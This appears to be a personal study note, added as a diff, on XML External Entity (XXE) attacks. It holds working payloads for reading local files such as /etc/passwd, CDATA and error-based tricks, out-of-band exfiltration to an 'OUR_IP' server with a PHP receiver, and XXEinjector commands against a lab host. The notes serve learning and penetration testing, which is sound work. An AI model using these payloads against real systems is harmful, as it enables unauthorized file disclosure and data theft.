@@ -1,0 +1,155 @@
+## Overview
+![[Pasted image 20250819164618.png]]
+XML External Entity 
+
+## Local File Disclosure
+If we have a request that uses XML to send data, we can use the `<!ENTITY>` keyword to create a variable and then put this variable in the request where it is reflected on the response;
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<root>
+<name>abumalik</name>
+<email>abumalik@ggb.hh</email>
+<message>this is the best website I've ever seen in my 20 years on this forsaken earth</message>
+</root>
+```
+This is an example request where the server expects an XML document, we can add a DTD to the start of the file to declare the document structure where the value of the variable that will be inside the tag is a file;
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [<!ENTITY file SYSTEM "file:///etc/passwd">]>
+<root>
+<name>abumalik</name>
+<email>abumalik@ggb.hh</email>
+<message>this is the best website I've ever seen in my 20 years on this forsaken earth</message>
+</root>
+```
+If we send the request now, nothing would happen. This is because we need to reference our variable `file` like;
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [<!ENTITY file SYSTEM "file:///etc/passwd">]>
+<root>
+<name>abumalik</name>
+<email>&file;</email>
+<message>this is the best website I've ever seen in my 20 years on this forsaken earth</message>
+</root>
+```
+Now this is a familiar place to be. You can reference the [File Inclusion](obsidian://open?vault=offensive&file=notes%2FWeb%2FFile%20inclusion) paper for more attacks from here.
+
+
+>[!note]
+>We can use the PUBLIC keyword instead of SYSTEM. Both of them sorta do the same work
+
+>[!tip]
+>Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with an [online tool](https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.
+
+## Advanced File Disclosure
+Not all XXE vulnerabilities are as easy as the above, some times you want to extract files without encoding them due to the lack of a built in encode (you are not in a php server). In that case you can use the following methods
+### Advanced Exfiltration with CDATA
+To output data that does not conform to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters. One easy way to tackle this issue would be to define a `begin` internal entity with `<![CDATA[`, an `end` internal entity with `]]>`, and then place our external entity file in between, and it should be considered as a `CDATA` element, as follows:
+```xml
+<!DOCTYPE email [
+  <!ENTITY begin "<![CDATA[">
+  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
+  <!ENTITY end "]]>">
+  <!ENTITY joined "&begin;&file;&end;">
+]>
+```
+One problem though. Modern XXE parsers don't allow variables to be referenced inside other variables (to prevent DOS) and since XML prevents joining internal and external entities. To bypass this limitation, we can utilize `XML Parameter Entities`, a special type of entity that starts with a `%` character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:
+```xml
+<!ENTITY joined "%begin;%file;%end;">
+```
+We can start by creating a `DTD` file on our machine and starting a server so we can request the `DTD` file from the target webserver;
+```shell
+echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
+python -m http.server 8899
+```
+Then on the XML request to the server we can request our `DTD` file from our server;
+```xml
+<!DOCTYPE email [
+  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
+  <!ENTITY % file SYSTEM "file:///var/www/html/config.php"> <!-- reference external file -->
+  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
+  <!ENTITY % xxe SYSTEM "http://OUR_IP:8899/xxe.dtd"> <!-- reference our external DTD -->
+  %xxe;
+]>
+...
+<email>&joined;</email>
+```
+>[!note]
+>In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop).
+
+### Error Based XXE
+Another situation we may find ourselves in is one where the web application might not write any output, so we cannot control any of the XML input entities to write its content. In such cases, we would be `blind` to the XML output and so would not be able to retrieve the file content using our usual methods. We can cause an error on the application by calling a undefined variable or playing with the tag names (\<email\> becomes \<emai\>) 
+![[Pasted image 20250819174015.png]]
+The above image is a good illustration for a verbose error. to show the contents of the files we want on this page we start by hosting a `DTD` file that has the following
+```xml
+<!ENTITY % file SYSTEM "file:///etc/hosts">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+The above payload defines the `file` parameter entity and then joins it with an entity that does not exist. In this case, `%nonExistingEntity;` does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined `%file;` as part of the error. Now, we can call our external DTD script, and then reference the `error` entity, as follows:
+```xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote; <!-- calling the remote variable so it fetches the file contents from our server-->
+  %error; <!-- calling the error variable in our dtd file-->
+]>
+```
+### Blind Data Exfiltration
+A lot of times we will not see any output nor errors, in that case we can use the OOB or `Out Of Band` techniques. 
+#### Out-of-band Data Exfiltration
+To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows:
+```xml
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
+```
+If, for example, the file we want to read had the content of `XXE_SAMPLE_DATA`, then the `file` parameter would hold its base64 encoded data (`WFhFX1NBTVBMRV9EQVRB`). When the XML tries to reference the external `oob` parameter from our machine, it will request `http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB`. Finally, we can decode the `WFhFX1NBTVBMRV9EQVRB` string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:
+```php
+<?php
+if(isset($_GET['content'])){
+    error_log("\n\n" . base64_decode($_GET['content']));
+}
+?>
+```
+Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add `<root>&content;</root>`, which is needed to reference our entity and have it send the request to our machine with the file content:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
+  %remote;
+  %oob;
+]>
+<root>&content;</root>
+```
+>[!tip]
+>In addition to storing our base64 encoded data as a parameter to our URL, we may utilize `DNS OOB Exfiltration` by placing the encoded data as a sub-domain for our URL (e.g. `ENCODEDTEXT.our.website.com`), and then use a tool like `tcpdump` to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.
+
+## Automated OOB Exfiltration
+Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is [XXEinjector](https://github.com/enjoiz/XXEinjector). This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE. Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:
+```http
+POST /blind/submitDetails.php HTTP/1.1
+Host: 10.129.201.94
+Content-Length: 169
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Origin: http://10.129.201.94
+Referer: http://10.129.201.94/blind/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+XXEINJECT
+```
+Now, we can run the tool with the `--host`/`--httpport` flags being our IP and port, the `--file` flag being the file we wrote above, and the `--path` flag being the file we want to read. We will also select the `--oob=http` and `--phpfilter` flags to repeat the OOB attack we did above, as follows:
+```shell-session
+ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
+
+...SNIP...
+[+] Sending request with malicious XML.
+[+] Responding with XML for: /etc/passwd
+[+] Retrieved data:
+```
+
+We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the `Logs` folder under the tool, and we can find our file there:
+
+
